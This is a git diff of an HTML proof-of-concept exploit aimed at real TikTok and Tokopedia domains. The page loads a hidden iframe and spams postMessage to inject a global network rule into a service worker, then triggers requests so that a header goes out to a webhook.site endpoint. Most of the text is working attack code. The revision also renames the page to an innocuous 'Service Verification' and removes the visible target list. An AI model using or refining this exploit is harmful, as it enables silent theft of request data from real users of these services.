@@ -1,25 +1,24 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>System Update - Verification</title>
+    <title>Service Verification</title>
 </head>
-<body style="background: #000; color: #0f0; font-family: monospace; text-align: center;">
-    <h1>[ STATUS: INITIALIZING POC ]</h1>
-    <p>Targeting: mon.tiktokv.com & shop-id.tokopedia.com</p>
-
+<body style="background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 20px;">
+    <h1>[ STATUS: RUNNING ]</h1>
+    
     <iframe id="pwn_gate" 
             src="https://mon.tiktokv.com/monitor_web/settings/browser-settings" 
             style="display:none;"></iframe>
 
     <script>
         const gate = document.getElementById('pwn_gate');
-        const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e"; // GANTI DENGAN ID LU
+        const webhook = "https://webhook.site/ID_LU_BARU";
 
         const payload = {
             source: "main_thread",
             eventName: "network_rule",
             data: [{
-                ruleName: "persistent_zero_click_final",
+                ruleName: "zero_click_final_v3",
                 global: true,
                 conditions: [],
                 handlers: [{
@@ -32,35 +31,36 @@
         };
 
         function startInjection() {
-            console.log("Gate is open. Firing injection sequence...");
+            console.log("Gate Loaded (200 OK). Initializing injection...");
             
-            // Spam postMessage selama 5 detik untuk memastikan SW menangkapnya
+            // Spam postMessage selama 3 detik
             let count = 0;
             const bomb = setInterval(() => {
                 try {
                     gate.contentWindow.postMessage(payload, "*");
                 } catch(e) {}
                 count++;
-                if (count > 30) {
+                if (count > 20) {
                     clearInterval(bomb);
-                    console.log("Injection sequence complete.");
-                    triggerNetworkEvent();
+                    console.log("Injection sequence complete. No 404s triggered.");
+                    executeSilentTrigger();
                 }
-            }, 200);
+            }, 150);
         }
 
-        function triggerNetworkEvent() {
-            console.log("Triggering fetch to verify injection...");
+        function executeSilentTrigger() {
+            console.log("Triggering network rule via valid endpoint...");
             
-            // Trigger 1: Endpoint monitor (200 OK)
-            fetch("https://mon.tiktokv.com/monitor_web/settings/browser-settings", { mode: 'no-cors' });
-
-            // Trigger 2: Endpoint Tokopedia (Meski 404, header tetap akan terinjeksi)
-            const img = new Image();
-            img.src = "https://shop-id.tokopedia.com/favicon.ico?v=" + Date.now();
+            // Trigger fetch ke endpoint yang sama (200 OK)
+            // Ini akan memaksa SW mengirim header lu ke webhook
+            fetch("https://mon.tiktokv.com/monitor_web/settings/browser-settings", { 
+                mode: 'no-cors',
+                cache: 'no-store' 
+            }).then(() => {
+                console.log("Success! Check Reqable/Webhook for X-Pns-Referrer.");
+            });
         }
 
-        // Jalankan otomatis saat Iframe load
         gate.onload = startInjection;
     </script>
 </body>
